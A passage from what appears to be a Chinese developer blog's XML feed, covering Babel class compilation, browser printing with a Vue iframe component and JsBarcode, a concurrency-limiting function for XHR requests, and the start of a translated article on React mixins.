class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arr</span> </span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>() &#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push(val) &#123;</span><br><span class="line"><span class="keyword">this</span>.arr.push(val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVal(index) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.arr[index]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> Arr();</span><br><span class="line">arr.push(<span class="number">1</span>)</span><br><span class="line">arr.getVal()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_classCallCheck</span>(<span class="params">instance, Constructor</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (! (instance <span class="keyword">instanceof</span> Constructor)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_defineProperties</span>(<span class="params">target, props</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> descriptor = props[i];</span><br><span class="line">descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>;</span><br><span class="line">descriptor.configurable = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_createClass</span>(<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (protoProps) _defineProperties(Constructor.prototype, protoProps);</span><br><span class="line"><span class="keyword">if</span> (staticProps) _defineProperties(Constructor, staticProps);</span><br><span class="line"><span class="keyword">return</span> Constructor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Arr = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Arr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">_classCallCheck(<span class="keyword">this</span>, Arr); <span class="comment">// 检查是不是class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_createClass(Arr, [&#123;</span><br><span class="line">key: <span class="string">"push"</span>,</span><br><span class="line">value: <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr.push(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">key: <span class="string">"getVal"</span>,</span><br><span class="line">value: <span class="function"><span class="keyword">function</span> <span class="title">getVal</span>(<span class="params">index</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.arr[index];</span><br><span class="line">&#125;</span><br><span class="line">&#125;]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Arr;</span><br><span class="line">&#125; ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> Arr();</span><br><span class="line">arr.push(<span class="number">1</span>);</span><br><span class="line">arr.getVal();</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-babel-和-polyfill"><a href="#3-babel-和-polyfill" class="headerlink" title="3. babel 和 polyfill"></a>3. babel 和 polyfill</h3><p><em>有了babel，为什么要polyfill？</em><br>Babel默认只转换新的JS语法，而ES6新特性像Promise, async/await，则是通过<a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">core-js</a>实现。</p><p>Promise, aysnc/await, Generator, Set, Map, Proxy</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/lukehoban/es6features#readme" target="_blank" rel="noopener">ES6语法</a></li><li><a href="https://www.babeljs.cn/docs/usage" target="_blank" rel="noopener">Babel</a></li><li><a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">core-js</a></li><li><a href="https://juejin.im/post/5e534b7d6fb9a07cb83e20f2" target="_blank" rel="noopener">从源码看Babel是如何编译Async和Generator函数的</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>打印</title>
      <link href="/2020/04/15/print/"/>
      <url>/2020/04/15/print/</url>
      <content type="html"><![CDATA[<h3 id="1-打印接口"><a href="#1-打印接口" class="headerlink" title="1. 打印接口"></a>1. 打印接口</h3><p>弹出打印预览的窗口，通过页面生成pdf用于打印预览<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.print();</span><br><span class="line"><span class="built_in">document</span>.execCommand(<span class="string">'print'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'beforeprint'</span>, ()=&gt; &#123;</span><br><span class="line">  <span class="built_in">document</span>.body.innerHTML = <span class="string">'正在打印...'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'afterprint'</span>, ()=&gt; &#123;</span><br><span class="line">  <span class="built_in">document</span>.body.innerHTML = <span class="string">'打印完成...'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-打印样式"><a href="#2-打印样式" class="headerlink" title="2. 打印样式"></a>2. 打印样式</h3><p>在link上加上<code>media=&quot;print&quot;</code>来标识这是打印机才会应用的样式。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/print.css"</span> <span class="attr">media</span>=<span class="string">"print"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 媒体查询能实现同样的效果 */</span></span><br><span class="line">@<span class="keyword">media</span> print &#123;</span><br><span class="line">  <span class="selector-tag">h1</span> &#123; <span class="attribute">font-size</span>: <span class="number">20px</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-组件实现"><a href="#3-组件实现" class="headerlink" title="3. 组件实现"></a>3. 组件实现</h3><p>打印会把<code>document</code>下所有可见元素打印出来。如果希望页面上不相关的东西不要出现在打印中，可以创建一个iframe,把要打印的dom和样式表都丢进去，再调用iframe的打印事件。引用组件<em><code>&lt;print ref=&quot;print&quot;&gt;打印内容&lt;/print&gt;</code></em>，等内容加载完后，调用<em><code>this.$refs.print()</code></em>打印。</p><p>组件默认纵向打印，如果要横向打印，设置<code>direction=&quot;landscape&quot;</code>。</p><p>注意：如果打印内容有异步请求的内容，图片，要等所有内容都请求后，才能调用print方法。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- print.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: relative"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"printFrame"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"printFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">createIframe</span>(<span class="params">direction</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// addLinkToIframe</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> iframeDoc = iframe.contentWindow.document;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> linkList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> linkNode = <span class="built_in">Array</span>.prototype.slice.call(linkList, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">  linkNode.forEach(<span class="function"><span class="params">link</span> =&gt;</span> iframeDoc.write(link.outerHTML));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="comment">// addStyleToIframe</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> styleList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'style'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> styleNode = <span class="built_in">Array</span>.prototype.slice.call(styleList, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">  styleNode.forEach(<span class="function"><span class="params">style</span> =&gt;</span> iframeDoc.write(<span class="string">`&lt;style&gt;<span class="subst">$&#123;style.innerHTML&#125;</span>&lt;/style&gt;`</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="comment">// 设置横向纵向打印</span></span></span><br><span class="line"><span class="xml">  iframeDoc.write(`<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">    @media print&#123;</span></span><br><span class="line"><span class="undefined">      @page&#123;</span></span><br><span class="line"><span class="undefined">        size:A4 $&#123;direction&#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">      .printFrame div &#123;</span></span><br><span class="line"><span class="javascript">        width: $&#123;direction === <span class="string">'portrait'</span> ? <span class="string">'1200px'</span> : <span class="string">'950px'</span>&#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="javascript">    &lt;body&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined">  `);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> iframe;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">  props: &#123;</span></span><br><span class="line"><span class="undefined">    direction: &#123;</span></span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">'portrait'</span>,</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 打印</span></span></span><br><span class="line"><span class="undefined">    print() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> printFrame = <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> str = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'printFrame'</span>)[<span class="number">0</span>].innerHTML;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>).contentDocument.documentElement.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].innerHTML = str;</span></span><br><span class="line"><span class="undefined">      printFrame.document.close();</span></span><br><span class="line"><span class="undefined">      printFrame.focus();</span></span><br><span class="line"><span class="javascript">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">        printFrame.print();</span></span><br><span class="line"><span class="undefined">      &#125;, 300);</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted() &#123;</span></span><br><span class="line"><span class="javascript">    createIframe(<span class="keyword">this</span>.direction);</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.printFrame</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-id">#printFrame</span>&#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: -9999px;</span></span><br><span class="line"><span class="undefined">  left: -2000px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-打印表格"><a href="#4-打印表格" class="headerlink" title="4. 打印表格"></a>4. 打印表格</h3><p>表格太长的时候，实现分页功能，每个分页都带表头。且可自定义页头页尾<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"print-table"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>每页页尾内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.print-table</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: table;</span></span><br><span class="line"><span class="undefined">  thead &#123;</span></span><br><span class="line"><span class="undefined">    display: table-header-group;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  tfoot &#123;</span></span><br><span class="line"><span class="undefined">    display: table-footer-group;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-生成条形码"><a href="#5-生成条形码" class="headerlink" title="5. 生成条形码"></a>5. 生成条形码</h3><p>用jsBarCode生成条形码图片<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">ref</span>=<span class="string">"barcode"</span> <span class="attr">id</span>=<span class="string">"barcode"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsBarCode <span class="keyword">from</span> <span class="string">'jsbarcode'</span>;</span><br><span class="line"></span><br><span class="line">jsBarCode(<span class="keyword">this</span>.$refs.barcode, <span class="string">'YF123456'</span>, &#123;</span><br><span class="line">  format: <span class="string">'CODE128'</span>,</span><br><span class="line">  displayValue: <span class="literal">true</span>,</span><br><span class="line">  fontSize: <span class="number">30</span>,</span><br><span class="line">  height: <span class="number">100</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-分页符"><a href="#6-分页符" class="headerlink" title="6. 分页符"></a>6. 分页符</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"page-break-before:left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5b371a8a6fb9a00e5326f06c" target="_blank" rel="noopener">window.print —— 浏览器打印扫盲</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>js控制并发请求数</title>
      <link href="/2020/02/22/js%E6%8E%A7%E5%88%B6%E5%B9%B6%E5%8F%91%E8%AF%B7%E6%B1%82%E6%95%B0/"/>
      <url>/2020/02/22/js%E6%8E%A7%E5%88%B6%E5%B9%B6%E5%8F%91%E8%AF%B7%E6%B1%82%E6%95%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-Bug"><a href="#1-Bug" class="headerlink" title="1. Bug"></a>1. Bug</h3><p>碰到一个图片列表，部分图片请求失败的bug，处理了一波请求失败要怎么显示。<br>准备回家搞完最后一点，结果回家之后，网速变慢了，打开一看，请求失败的图片更多了。</p><p><img src="/2020/02/22/js控制并发请求数/3.jpg" style="max-width: 100px"></p><p>仔细一看，http status为<em>canceled</em>，时间都在30s之后。<br>也就是说，不是图片加载不出来，而是一时间并发请求太多，请求堵塞，导致后面的请求超时，导致最终被取消。<br><strong>（ 浏览器限制同一域名同一时间只能有6个并发请求 ）</strong></p><p><img src="/2020/02/22/js控制并发请求数/2.png"></p><p><img src="/2020/02/22/js控制并发请求数/1.png"></p><p><br></p><h3 id="2-为什么平时批量请求图片没问题"><a href="#2-为什么平时批量请求图片没问题" class="headerlink" title="2. 为什么平时批量请求图片没问题"></a>2. 为什么平时批量请求图片没问题</h3><p>这次的图片是通过XHR请求，获取图片的base64内容。我们一般会给XHR设置一个超时时间，而平时用的<code>&lt;img src&gt;</code>没有人为的超时限制，只有服务器明确返回请求失败，才算失败。</p><p><br></p><h3 id="3-解决"><a href="#3-解决" class="headerlink" title="3. 解决"></a>3. 解决</h3><p>这时我们需要实现一个并发控制函数，保证每次最多只有6个请求，无论哪一个先执行完，都会继续执行下一个，直到所有请求完成。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @params list &#123;Array&#125; 等待请求的队列</span></span><br><span class="line"><span class="comment"> * @params limit &#123;Number&#125; 控制的并发数量最大数</span></span><br><span class="line"><span class="comment"> * @params asyncHandle &#123;Function&#125; 对list每一项的请求函数，必须return Promise来继续进行请求</span></span><br><span class="line"><span class="comment"> * @return &#123;Promise&#125; 返回一个 Promise 确认所有数据是否迭代完成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> mapLimit = <span class="function">(<span class="params">list, limit, asyncHandle</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">let</span> recursion = <span class="function">(<span class="params">arr</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> asyncHandle(arr.shift())</span><br><span class="line">.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (arr.length !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> recursion(arr) <span class="comment">// 数组未迭代完，继续请求</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> listCopy = [].concat(list)b</span><br><span class="line"><span class="keyword">let</span> asyncList = [] <span class="comment">// 正在进行的所有并发异步操作</span></span><br><span class="line"><span class="keyword">while</span> (limit--) &#123;</span><br><span class="line">asyncList.push(recursion(listCopy))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Promise</span>.all(asyncList) <span class="comment">// 所有并发异步操作都完成后，本次并发控制迭代完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/SunshowerC/blog/issues/2" target="_blank" rel="noopener">15行代码实现并发控制</a></li></ul>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mixin Considered Harmful(译文)</title>
      <link href="/2019/12/19/Mixin/"/>
      <url>/2019/12/19/Mixin/</url>
      <content type="html"><![CDATA[<blockquote><p>最近刚接触Vue，一个Vue实例总是调用一个未定义的方法，仔细一看是引用了Mixin，不看不知道，一看吓一跳。代码里好多Mixin啊。一个Mixin里可能又引用了其他Mixin，最后你没办法知道Mixin里的方法都被哪些组件引用了。难搞哦…<br><br>之前写React的时候都会封装成组件，来实现代码复用，React倒是没有Mixins这个概念。React官网倒是看到一篇文章 - <a href="https://reactjs.org/blog/2016/07/13/mixins-considered-harmful.html" target="_blank" rel="noopener">Mixins Considered Harmful</a>。网上找到了它的<a href="https://lizhiyao.github.io/2018/01/05/f2e/mixins-considered-harmful/" target="_blank" rel="noopener">中文版</a>，在这里留个记录。<br>（后记：后来觉得Mixin真香！一些简单页面，简单固定逻辑，用Mixin会很方便）</p></blockquote><p><br></p><h3 id="Mixins或许不太好"><a href="#Mixins或许不太好" class="headerlink" title="Mixins或许不太好"></a><strong>Mixins或许不太好</strong></h3><p>“如何在不同的组件之间进行代码复用？”是人们在学习 React 时首先要问的问题之一，我们的答案始终是使用组件组合来重用代码。你可以定义一个组件并在其他几个组件中使用它。</p><p>某种确定的模式通过用组合的方式进行解决并不总是显而易见的。React 受函数式编程的影响，但进入了以面向对象库为主的领域。Facebook 内部和外部的工程师很难放弃他们习惯的模式。</p><p>为了简化最初的采用和学习，我们在 React 中加入了一些“逃生”功能。mixin 系统就是其中一种逃生方法，它的目标是当你不知道如何通过组合解决问题时，给你另外一种在组件之间重用代码的方法。</p><p>React 已经发布三年了，前端领域的技术在这三年中也发生了翻天覆地的变化。现在多个用于构建用户界面的前端框架都采用了类似于 React 的组件模型。使用基于继承的组合声明式的构建用户界面，不再是新鲜事物。我们对 React 组件模型也更加自信，我们在内部和社区都看到了它的许多创造性的用途。</p><p>在这篇文章中，我们将思考通常是由 mixin 引起的问题。然后，我们将为相同的用例提出几种替代模式。我们发现随着项目代码复杂度的增加，这些替代的模式的可扩展性比使用 mixin 更好。</p><p><br></p><h3 id="React为什么不用Mixin"><a 